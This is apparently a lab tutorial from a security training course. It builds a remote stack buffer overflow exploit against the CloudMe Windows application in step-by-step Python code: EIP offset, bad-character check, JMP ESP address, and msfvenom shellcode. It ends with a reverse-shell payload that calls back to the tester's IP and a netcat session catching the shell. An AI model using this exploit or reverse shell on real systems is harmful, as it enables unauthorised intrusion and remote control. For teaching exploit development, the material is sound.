+    pattern = <span class="hljs-keyword">bytes</span>(<span class="hljs-string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"</span>
+                    ...SNIP...
+                    <span class="hljs-string">"5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"</span>, <span class="hljs-string">"utf-8"</span>)
+
+    s = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET, <span class="hljs-built_in">socket</span>.SOCK_STREAM)
+    s.connect((IP, port))
+    s.<span class="hljs-built_in">send</span>(pattern)
+    s.<span class="hljs-built_in">close</span>()
+
+eip_offset()
+</code></pre>
+<p>Once our <code>eip_offset()</code> function is ready, we can restart our program in <code>x32dbg</code> and run our code, and our program should crash, and we should see <code>EIP</code> overwritten with our pattern as <code>316A4230</code>: <img src="storage\modules\89\win32bof_remote_pattern_crash.jpg" alt="Registers EAX to EDI with values, EIP highlighted as 316A4230."></p>
+<p>Now we can use <code>ERC --pattern o 1jB0</code> to calculate the exact offset, which is found at <code>1052</code> bytes:</p>
+<p><img src="storage\modules\89\win32bof_remote_pattern_offset.jpg" alt="ERC pattern command output: Value reversed at position 1052. Command: ERC --pattern o 1jB0."></p>
+<p>Now to ensure that we can control the exact value at <code>EIP</code>, we'll use the same <code>eip_control()</code> function from our previous exploit (while changing <code>offset</code>), but with using <code>socket</code> to send our payload instead of writing it to a file:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">def eip_control():
+    <span class="hljs-built_in">offset</span> = <span class="hljs-number">1052</span>
+    buffer = b<span class="hljs-string">"A"</span>*<span class="hljs-built_in">offset</span>
+    eip = b<span class="hljs-string">"B"</span>*<span class="hljs-number">4</span>
+    payload = buffer + eip
+
+    s = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET, <span class="hljs-built_in">socket</span>.SOCK_STREAM)
+    s.connect((IP, port))
+    s.<span class="hljs-built_in">send</span>(payload)
+    s.<span class="hljs-built_in">close</span>()
+
+eip_control()
+</code></pre>
+<p>We'll once again restart our program and run our exploit, and we can confirm that we control <code>EIP</code> as we overwrote <code>EIP</code> with 4 <code>B</code>'s: <img src="storage\modules\89\win32bof_remote_pattern_control.jpg" alt="Registers EAX to EDI with values, EIP highlighted as 42424242."></p>
+<hr>
+<h3 id="identifying-bad-characters">Identifying Bad Characters</h3>
+<p>Our next step is to identify whether we should avoid using any bad characters in our input. We can start by running <code>ERC --bytearray</code> in <code>x32dbg</code> to create our <code>ByteArray_1.bin</code> file. Then we can copy the same <code>bad_chars()</code> functions from our previous exploit, and once again change from writing the payload to a file to sending it to the port:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">def bad_chars():
+    all_chars = bytes([
+        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x07</span>,
+        ...SNIP...
+        <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>
+    ])
+
+    offset = <span class="hljs-number">1052</span>
+    buffer = b<span class="hljs-string">"A"</span>*offset
+    <span class="hljs-built_in">eip</span> = b<span class="hljs-string">"B"</span>*<span class="hljs-number">4</span>
+    payload = buffer + <span class="hljs-built_in">eip</span> + all_chars
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((<span class="hljs-built_in">IP</span>, port))
+    s.send(payload)
+    s.close()
+
+bad_chars()
+</code></pre>
+<p>Once we restart our program in <code>x32dbg</code> and run our exploit, we can use <code>ERC --compare</code> to compare the bytes at the <code>ESP</code> address with the <code>ByteArray_1.bin</code> file: <img src="storage\modules\89\win32bof_remote_bytes_compare.jpg" alt="Comparing memory region at 0xA3AA30 with file bytes, showing matches. Command: ERC --compare 00A3AA30 C:\Users\htb-student\Desktop\ByteArray\_1.bin."></p>
+<p>As we can see, all of the bytes match between memory and <code>ByteArray_1.bin</code>, which means that this program does not have any bad characters.</p>
+<hr>
+<h3 id="finding-a-return-instruction">Finding a Return Instruction</h3>
+<p>Now that we have control over <code>EIP</code> and know which bad characters to avoid in our payload, we need to find an instruction to execute the payload we will place on the stack. Once again, since this program does not have any bad characters, we can use the <code>ESP</code> address as our return address. (Try to exploit the program by using <code>ESP</code> as the return address).</p>
+<p>However, we will prefer using an address of an instruction built within the program to ensure it will run on any system, as these instructions will be the same on any system. So, we'll first get a list of modules and libraries loaded by the program, and we will only consider ones that have <code>False</code> for all protections, which are the following:</p>
+<p>  Building a Remote Exploit</p>
+<pre><code class="lang-cmd-session">------------------------------------------------------------------------------------------------------------------------ 
+Process Name: CloudMe Modules total: 79 
+------------------------------------------------------------------------------------------------------------------------ 
+ Base          | Entry point   | Size      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, Name and Path 
+------------------------------------------------------------------------------------------------------------------------ 
+ 0x400000        0x14c0          0x431000    False      False      False      False      False      C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\C</span>loudMe.exe 
+ 0x61b40000      0x1410          0x5f6000    False      False      False      False      False      5.9.0.0;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\Q</span>t5Gui.dll 
+ 0x69900000      0x1410          0x1c1000    False      False      False      False      False      5.9.0.0;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\Q</span>t5Network.dll 
+ 0x6d9c0000      0x1410          0x4c000     False      False      False      False      False      5.9.0.0;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\Q</span>t5Sql.dll 
+ 0x66e00000      0x1410          0x3d000     False      False      False      False      False      5.9.0.0;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\Q</span>t5Xml.dll 
+ 0x6eb40000      0x1410          0x24000     False      False      False      False      False      C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\l</span>ibgcc_s_dw2-1.dll 
+ 0x6fe40000      0x1410          0x17e000    False      False      False      False      False      C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\l</span>ibstdc++-6.dll 
+ 0x64b40000      0x1410          0x1b000     False      False      False      False      False      1,;WinPthreadGC;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\l</span>ibwinpthread-1.dll 
+ 0x6aa80000      0x1410          0x1b7000    False      False      False      False      False      5.9.0.0;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\P</span>rograms<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\C</span>loudMe<span class="hljs-symbol">\p</span>latforms<span class="hljs-symbol">\q</span>windows.dll
+</code></pre>
+<p>As we can see, there are several libraries loaded by the program with no memory protections, including the <code>CloudMe.exe</code> program itself. To search all of them for <code>JMP ESP</code>, we can go to the <code>CPU</code> tab and right-click then select <code>Search For&gt;All Modules&gt;Command</code>, and enter the <code>JMP ESP</code>, and we will get a list of <code>JMP ESP</code> instructions in loaded modules: <img src="storage\modules\89\win32bof_remote_find_jmp_1.jpg" alt="Disassembly showing 'jmp esp' at addresses 0069D2E5, 006B2ABD, 006BDA22, 006C977D."></p>
+<p>If we had not found any results, we could search for the <code>FFE4</code> pattern in the entire module or all modules, as was shown in an earlier section. We can also look for other useful instructions, like <code>54C3</code>. In our case, after double-clicking on the first result to ensure it is indeed <code>JMP ESP</code>, we can copy the address <code>0069D2E5</code> and use it in our exploit. (Try to find other instructions and use them as the return address).</p>
+<hr>
+<h3 id="jumping-to-shellcode">Jumping to Shellcode</h3>
+<p>Our final step is to exploit the program, so we'll start by creating our shellcode with <code>msfvenom</code> to open <code>calc.exe</code> as proof of successful exploitation:</p>
+<p>  Building a Remote Exploit</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
+
+...SNIP...
+buf =  b""
+buf += b"<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>82<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e5<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>8b"
+buf += b"<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>30<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>14<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>b7"
+buf += b"<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>26<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>cf"
+...SNIP...
+</code></pre>
+<p>Now to create our final <code>exploit()</code> function, we'll first add the above output, and will use the same <code>payload</code> from our previous exploit (while changing <code>offset</code> and address in <code>eip</code>). Finally, we will use the same code from <code>bad_chars()</code> to send our payload to the port:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">def exploit():
+    <span class="hljs-comment"># msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'</span>
+    <span class="hljs-keyword">buf </span>= <span class="hljs-keyword">b""
+</span>    ...SNIP...
+    <span class="hljs-keyword">buf </span>+= <span class="hljs-keyword">b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
+</span>
+    offset = <span class="hljs-number">1052</span>
+    <span class="hljs-keyword">buffer </span>= <span class="hljs-keyword">b"A"*offset
+</span>    <span class="hljs-keyword">eip </span>= pack(<span class="hljs-string">'&lt;L'</span>, <span class="hljs-number">0x0069D2E5</span>)
+    <span class="hljs-keyword">nop </span>= <span class="hljs-keyword">b"\x90"*32
+</span>    payload = <span class="hljs-keyword">buffer </span>+ <span class="hljs-keyword">eip </span>+ <span class="hljs-keyword">nop </span>+ <span class="hljs-keyword">buf
+</span>
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.<span class="hljs-keyword">close()
+</span>
+exploit()
+</code></pre>
+<p>Finally, we can run <code>CloudMe</code> (not necessarily in <code>x32dbg</code>) and run our exploit, and we should see it crash, and a calculator should pop open.</p>
+<hr>
+<h2 id="remote-exploitation">Remote Exploitation</h2>
+<hr>
+<p>As we have built and tested our exploit, we can now try running it on a real remote server. We can use the same exploit on the real target, and we only need to change the <code>IP</code> and <code>port</code> in our script to aim it at the new target and change the shellcode we use within the script to something that will send us a reverse shell.</p>
+<hr>
+<h3 id="reverse-shell-shellcode">Reverse Shell Shellcode</h3>
+<p>First, we need to find our machine's IP, which should be reachable by the remote server (in the same network subnet):</p>
+<p>  Remote Exploitation</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ip -<span class="hljs-number">4</span> a
+
+<span class="hljs-number">1</span>: lo: <span class="hljs-variable">&lt;LOOPBACK,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">65536</span> qdisc noqueue <span class="hljs-keyword">state</span> UNKNOWN <span class="hljs-keyword">group</span> <span class="hljs-keyword">default</span> qlen <span class="hljs-number">1000</span>
+    ...SNIP...
+<span class="hljs-number">2</span>: eth0: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc pfifo_fast <span class="hljs-keyword">state</span> UP <span class="hljs-keyword">group</span> <span class="hljs-keyword">default</span> qlen <span class="hljs-number">1000</span>
+    ...SNIP...
+<span class="hljs-number">3</span>: eth1: <span class="hljs-variable">&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc pfifo_fast <span class="hljs-keyword">state</span> UP <span class="hljs-keyword">group</span> <span class="hljs-keyword">default</span> qlen <span class="hljs-number">1000</span>
+    ...SNIP...
+<span class="hljs-number">5</span>: tun0: <span class="hljs-variable">&lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt;</span> mtu <span class="hljs-number">1500</span> qdisc pfifo_fast <span class="hljs-keyword">state</span> UNKNOWN <span class="hljs-keyword">group</span> <span class="hljs-keyword">default</span> qlen <span class="hljs-number">100</span>
+    <span class="hljs-keyword">inet</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">15.10</span>/<span class="hljs-number">23</span> brd <span class="hljs-number">10.10</span>.<span class="hljs-number">15.255</span> scope <span class="hljs-keyword">global</span> tun0
+</code></pre>
+<p>The IP we will use is <code>tun0</code>'s IP, as our VM is on the same <code>10.10.</code> subnet.</p>
+<p>Note: You need to be connected to the VPN to be able to interact with the remote server, so download the VPN key in case you want to run the exploit from your own machine. The PwnBox instance is already connected to the VPN, so you should be able to connect to the remote server.</p>
+<p>Next, we will generate the shellcode that will send us a reverse shell, which we can get with the <code>windows/shell_reverse_tcp</code> payload in <code>msfvenom</code>, as follows:</p>
+<p>  Remote Exploitation</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'
+
+...SNIP...
+buf =  b""
+buf += b"<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>82<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>e5<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>64<span class="hljs-symbol">\x</span>8b"
+...SNIP...
+</code></pre>
+<p>We can modify our exploit by copying the output and using it in the <code>exploit()</code> function for the <code>buf</code> variable.</p>
+<hr>
+<h3 id="remote-exploitation">Remote Exploitation</h3>
+<p>After that, we can start a <code>netcat</code> listener to receive the reverse shell, as follows:</p>
+<p>  Remote Exploitation</p>
+<pre><code class="lang-shell-session"><span class="hljs-symbol">root</span>@htb[/htb]$ nc -lvnp <span class="hljs-number">1234</span>
+
+listening on [any] <span class="hljs-number">1234</span> ...
+</code></pre>
+<p>Once we are listening, we can run our payload with <code>python win32bof_exploit_remote.py</code> and wait for the remote server to send us a reverse shell if our exploitation was successful.</p>
+<p>  Remote Exploitation</p>
+<pre><code class="lang-shell-session"><span class="hljs-symbol">root</span>@htb[/htb]$ nc -lvnp <span class="hljs-number">1234</span>
+
+listening on [any] <span class="hljs-number">1234</span> ...
+connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.15</span><span class="hljs-number">.10</span>] from (<span class="hljs-symbol">UNKNOWN</span>) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span>] <span class="hljs-number">64539</span>
+<span class="hljs-symbol">Microsoft</span> <span class="hljs-symbol">Windows</span> [<span class="hljs-symbol">Version</span> <span class="hljs-number">10.0</span><span class="hljs-number">.19042</span><span class="hljs-number">.928</span>]
+(c) <span class="hljs-symbol">Microsoft</span> <span class="hljs-symbol">Corporation</span>. <span class="hljs-symbol">All</span> rights reserved.
+
+<span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Users</span>\htb-student\<span class="hljs-symbol">AppData</span>\<span class="hljs-symbol">Local</span>\<span class="hljs-symbol">Programs</span>\<span class="hljs-symbol">CloudMe</span>\<span class="hljs-symbol">CloudMe</span>&gt;whoami
+whoami
+htb-student
+</code></pre>
+<p>As we can see, without having local access to the remote server, we successfully exploited the remote service and received a reverse shell. This shows us that if we properly debug the program, we can build and test our exploit locally, then run it on any remote server with the vulnerable program listening for remote connections.</p>
+<p>You can download the final exploit code from the following link. Don't forget to rename it from <code>.txt</code> to <code>.py</code>.</p>
+<p><a href="https://academy.hackthebox.com/storage/modules/89/scripts/win32bof_exploit_remote_py.txt">Download win32bof_exploit_remote_py.txt here</a></p>
+<hr>
+</body></html>
